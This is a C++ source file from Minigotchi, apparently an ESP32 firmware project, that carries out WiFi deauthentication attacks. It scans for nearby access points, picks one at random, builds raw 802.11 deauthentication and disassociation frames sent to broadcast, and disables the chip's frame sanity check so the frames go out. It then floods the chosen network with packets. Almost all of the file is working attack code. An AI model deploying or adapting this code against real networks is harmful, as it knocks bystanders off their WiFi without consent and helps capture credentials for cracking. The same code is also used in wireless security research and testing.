/*
 * Minigotchi: An even smaller Pwnagotchi
 * Copyright (C) 2024 dj1ch
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
 * deauth.cpp: handles the deauth of a local AP
 */

#include "deauth.h"

/** developer note:
 *
 * the deauth frame is defined here.
 * this is a raw frame(layer 2)
 * man i hate networking
 *
 */

// for some dumb reason espressif really doesn't like us sending deauth frames,
// so i'll need to make this fix
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
                                                int32_t arg3) {
  return 0;
}

// default values before we start
bool Deauth::running = false;
std::vector<String> Deauth::whitelist = {};
String Deauth::randomAP = "";
int Deauth::randomIndex;

/**
 * Gets first instance of mood class
 */
Mood &Deauth::mood = Mood::getInstance();

/** developer note:
 *
 * instead of using the deauth frame normally, we append information to the
 * deauth frame and dynamically write info to the frame
 *
 */

uint8_t Deauth::deauthTemp[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC,
                                  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
                                  0xCC, 0x00, 0x00, 0x01, 0x00};

uint8_t Deauth::deauthFrame[26];
uint8_t Deauth::disassociateFrame[26];
uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/**
 * Adds SSIDs (or BSSIDs) to the whitelist
 * @param bssids SSIDs/BSSIDs to whitelist
 */
void Deauth::add(const std::string &bssids) {
  std::stringstream ss(bssids);
  std::string token;

  // seperate info and whitelist
  while (std::getline(ss, token, ',')) {
    // trim out whitespace
    token.erase(0, token.find_first_not_of(" \t\r\n"));
    token.erase(token.find_last_not_of(" \t\r\n") + 1);

    // add to whitelist
    Serial.print(mood.getNeutral() + " Adding ");
    Serial.print(token.c_str());
    Serial.println(" to the whitelist");
    Display::updateDisplay(mood.getNeutral(), "Adding " +
                                                  (String)token.c_str() +
                                                  " to the whitelist");
    delay(Config::shortDelay);
    whitelist.push_back(token.c_str());
  }
}

/**
 * Adds everything to the whitelist
 */
void Deauth::list() {
  for (const auto &bssid : Config::whitelist) {
    Deauth::add(bssid);
  }
}

/**
 * Sends a packet
 * @param buf Packet to send
 * @param len Length of packet
 * @param sys_seq Ignore this, just make it false
 */
bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sys_seq);
  delay(102);

  return (err == ESP_OK);
}

/**
 * Check if packet source address is a broadcast
 * source:
 * https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
 * @param mac Mac address to check
 */
bool Deauth::broadcast(uint8_t *mac) {
  for (uint8_t i = 0; i < 6; i++) {
    if (mac[i] != broadcastAddr[i])
      return false;
  }

  return true;
}

/**
 * Format Mac Address as a String, then print it
 * @param mac Address to print
 */
void Deauth::printMac(uint8_t *mac) {
  String macStr = printMacStr(mac);
  Serial.println(macStr);
  Display::updateDisplay(mood.getNeutral(), "AP BSSID: " + macStr);
}

/**
 * Function meant to print Mac as a String used in printMac()
 * @param mac Mac to use
 */
String Deauth::printMacStr(uint8_t *mac) {
  char buf[18]; // 17 for MAC, 1 for null terminator
  snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1],
           mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

/**
 * Selects an AP to deauth, returns a boolean based on if the scan and selection
 * was successful
 */
bool Deauth::select() {
  // reset values
  Deauth::randomAP = "";
  Deauth::randomIndex = -1;

  Parasite::sendDeauthStatus(START_SCAN);

  // cool animation, skip if parasite mode
  if (!Config::parasite) {
    for (int i = 0; i < 5; ++i) {
      Serial.println(mood.getLooking1() + " Scanning for APs.");
      Display::updateDisplay(mood.getLooking1(), "Scanning  for APs.");
      delay(Config::shortDelay);
      Serial.println(mood.getLooking2() + " Scanning for APs..");
      Display::updateDisplay(mood.getLooking2(), "Scanning  for APs..");
      delay(Config::shortDelay);
      Serial.println(mood.getLooking1() + " Scanning for APs...");
      Display::updateDisplay(mood.getLooking1(), "Scanning  for APs...");
      delay(Config::shortDelay);
      Serial.println(" ");
      delay(Config::shortDelay);
    }
    delay(Config::longDelay);
  }

  // stop and scan
  Minigotchi::monStop();

  int apCount = 0;
  // If a parasite channel is set, then we want to focus on that channel
  // Otherwise go off on our own and scan for whatever is out there
  if (Parasite::channel > 0) {
    apCount = WiFi.scanNetworks(false, false, Parasite::channel);
  } else {
    apCount = WiFi.scanNetworks();
  }

  if (apCount > 0 && Deauth::randomIndex == -1) {
    Deauth::randomIndex = random(apCount);
    Deauth::randomAP = WiFi.SSID(Deauth::randomIndex);
    uint8_t encType = WiFi.encryptionType(Deauth::randomIndex);

    Serial.print(mood.getNeutral() + " Selected random AP: ");
    Serial.println(randomAP.c_str());
    Serial.println(" ");
    Display::updateDisplay(mood.getNeutral(),
                           "Selected random AP: " + randomAP);
    delay(Config::shortDelay);

    if (encType == WIFI_AUTH_OPEN || encType == -1) {
      Serial.println(
          mood.getNeutral() +
          " Selected AP is not encrypted. Skipping deauthentication...");
      Display::updateDisplay(
          mood.getNeutral(),
          "Selected AP is not encrypted. Skipping deauthentication...");
      delay(Config::shortDelay);
      Parasite::sendDeauthStatus(SKIPPING_UNENCRYPTED);
      return false;
    }

    // check for ap in whitelist
    if (std::find(whitelist.begin(), whitelist.end(), randomAP) !=
        whitelist.end()) {
      Serial.println(mood.getNeutral() +
                     " Selected AP is in the whitelist. Skipping "
                     "deauthentication...");
      Display::updateDisplay(
          mood.getNeutral(),
          "Selected AP is in the whitelist. Skipping deauthentication...");
      delay(Config::shortDelay);
      Parasite::sendDeauthStatus(SKIPPING_WHITELIST);
      return false;
    }

    /** developer note:
     *
     * here we will create the deauth frame using the header,
     * as we find the AP in question we also generate the required information
     * for it as well...
     *
     */

    // clear out exisitng frame...
    std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame),
              0);
    std::fill(std::begin(Deauth::disassociateFrame),
              std::end(Deauth::disassociateFrame), 0);

    // copy template
    std::copy(Deauth::deauthTemp,
              Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
              Deauth::deauthFrame);
    std::copy(Deauth::deauthTemp,
              Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
              Deauth::disassociateFrame);

    Deauth::deauthFrame[0] = 0xC0; // type
    Deauth::deauthFrame[1] = 0x00; // subtype
    Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
    Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

    Deauth::disassociateFrame[0] = 0xA0; // type
    Deauth::disassociateFrame[1] = 0x00; // subtype
    Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
    Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

    // bssid
    uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);

    /** developer note:
     *
     * addr1: reciever addr
     * addr2: sender addr
     * addr3: filtering addr
     *
     */

    // copy our mac(s) to header
    std::copy(Deauth::broadcastAddr,
              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
              Deauth::deauthFrame + 4);
    std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 10);
    std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 16);

    std::copy(Deauth::broadcastAddr,
              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
              Deauth::disassociateFrame + 4);
    std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 10);
    std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 16);

    // checks if this is a broadcast
    if (!broadcast(Deauth::broadcastAddr)) {
      // build deauth
      Deauth::deauthFrame[0] = 0xC0; // type
      Deauth::deauthFrame[1] = 0x00; // subtype
      Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
      Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

      // reason
      Deauth::deauthFrame[24] = 0x01; // reason: unspecified

      std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::deauthFrame + 10);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::deauthFrame + 16);

      // build disassocaition
      Deauth::disassociateFrame[0] = 0xA0; // type
      Deauth::disassociateFrame[1] = 0x00; // subtype
      Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
      Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

      std::copy(apBssid, apBssid + sizeof(apBssid),
                Deauth::disassociateFrame + 4);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::disassociateFrame + 10);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::disassociateFrame + 16);
    }

    Serial.print(mood.getNeutral() + " Full AP SSID: ");
    Serial.println(WiFi.SSID(Deauth::randomIndex));
    Display::updateDisplay(mood.getNeutral(),
                           "Full AP SSID: " + WiFi.SSID(Deauth::randomIndex));

    Serial.print(mood.getNeutral() + " AP Encryption: ");
    Serial.println(WiFi.encryptionType(Deauth::randomIndex));
    Display::updateDisplay(
        mood.getNeutral(),
        "AP Encryption: " + (String)WiFi.encryptionType(Deauth::randomIndex));

    Serial.print(mood.getNeutral() + " AP RSSI: ");
    Serial.println(WiFi.RSSI(Deauth::randomIndex));
    Display::updateDisplay(mood.getNeutral(),
                           "AP RSSI: " +
                               (String)WiFi.RSSI(Deauth::randomIndex));

    Serial.print(mood.getNeutral() + " AP BSSID: ");
    printMac(apBssid);

    Serial.print(mood.getNeutral() + " AP Channel: ");
    Serial.println(WiFi.channel(Deauth::randomIndex));
    Display::updateDisplay(mood.getNeutral(),
                           "AP Channel: " +
                               (String)WiFi.channel(Deauth::randomIndex));

    Serial.println(" ");
    delay(Config::longDelay);

    Parasite::sendDeauthStatus(PICKED_AP, Deauth::randomAP.c_str(),
                               WiFi.channel(Deauth::randomIndex));

    return true;
  } else if (apCount < 0) {
    Serial.println(mood.getSad() +
                   " I don't know what you did, but you screwed up!");
    Serial.println(" ");
    Display::updateDisplay(mood.getSad(), "You screwed up somehow!");

    Parasite::sendDeauthStatus(DEAUTH_SCAN_ERROR);

    delay(Config::shortDelay);
  } else {
    // well ur fucked.
    Serial.println(mood.getSad() + " No access points found.");
    Serial.println(" ");
    Display::updateDisplay(mood.getSad(), "No access points found.");

    Parasite::sendDeauthStatus(NO_APS);

    delay(Config::shortDelay);
  }
  return false;
}

/**
 * Full deauthentication attack
 */
void Deauth::deauth() {
  if (Config::deauth) {
    // select AP
    if (Deauth::select()) {
      if (randomAP.length() > 0) {
        Serial.println(
            mood.getIntense() +
            " Starting deauthentication attack on the selected AP...");
        Serial.println(" ");
        Display::updateDisplay(mood.getIntense(),
                               "Begin deauth-attack on AP...");
        delay(Config::shortDelay);
        // define the attack
        if (!running) {
          start();
        } else {
          Serial.println(mood.getNeutral() + " Attack is already running.");
          Serial.println(" ");
          Display::updateDisplay(mood.getNeutral(),
                                 "Attack is already running.");
          delay(Config::shortDelay);
        }
      } else {
        // ok why did you modify the deauth function? i literally told you to
        // not do that...
        Serial.println(mood.getBroken() +
                       " No access point selected. Use select() first.");
        Serial.println(mood.getNeutral() + " Told you so!");
        Serial.println(" ");
        Display::updateDisplay(mood.getBroken(),
                               "No access point selected. Use select() first.");
        delay(Config::shortDelay);
        Display::updateDisplay(mood.getNeutral(), "Told you so!");
        delay(Config::shortDelay);
        return;
      }
    }
  } else {
    // do nothing if deauthing is disabled
  }
}

/**
 * Starts deauth attack
 */
void Deauth::start() {
  running = true;
  int deauthFrameSize = sizeof(deauthFrame);
  int disassociateFrameSize = sizeof(disassociateFrame);
  int packets = 0;
  unsigned long startTime = millis();

  // packet calculation
  int basePacketCount = 150;
  int rssi = WiFi.RSSI(Deauth::randomIndex);
  int numDevices = WiFi.softAPgetStationNum();

  int packetCount = basePacketCount + (numDevices * 10);
  if (rssi > -50) {
    packetCount /= 2; // strong signal
  } else if (rssi < -80) {
    packetCount *= 2; // weak signal
  }

  Parasite::sendDeauthStatus(START_DEAUTH, Deauth::randomAP.c_str(),
                             WiFi.channel(Deauth::randomIndex));

  // send the deauth 150 times(ur cooked if they find out)
  for (int i = 0; i < packetCount; ++i) {
    if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
        Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      packets++;
      float pps = packets / (float)(millis() - startTime) * 1000;

      // show pps
      if (!isinf(pps)) {
        Serial.print(mood.getIntense() + " Packets per second: ");
        Serial.print(pps);
        Serial.print(" pkt/s");
        Serial.println(" (AP:" + randomAP + ")");
        Display::updateDisplay(mood.getIntense(),
                               "Packets per second: " + (String)pps + " pkt/s" +
                                   " (AP:" + randomAP + ")");
      }
    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(mood.getBroken() + " Both packets failed to send!");
      Display::updateDisplay(mood.getBroken(), "Both packets failed to send!");
    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(mood.getBroken() + " Deauthentication failed to send!");
      Display::updateDisplay(mood.getBroken(), "Deauth failed to send!");
    } else if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(mood.getBroken() + " Disassociation failed to send!");
      Display::updateDisplay(mood.getBroken(), "Disassoc failed to send!");
    } else {
      Serial.println(mood.getBroken() + " Unable to calculate pkt/s!");
      Display::updateDisplay(mood.getBroken(), "Unable to calculate pkt/s!");
    }
  }

  Serial.println(" ");
  Serial.println(mood.getHappy() + " Attack finished!");
  Serial.println(" ");
  Display::updateDisplay(mood.getHappy(), "Attack finished!");
  running = false;
}
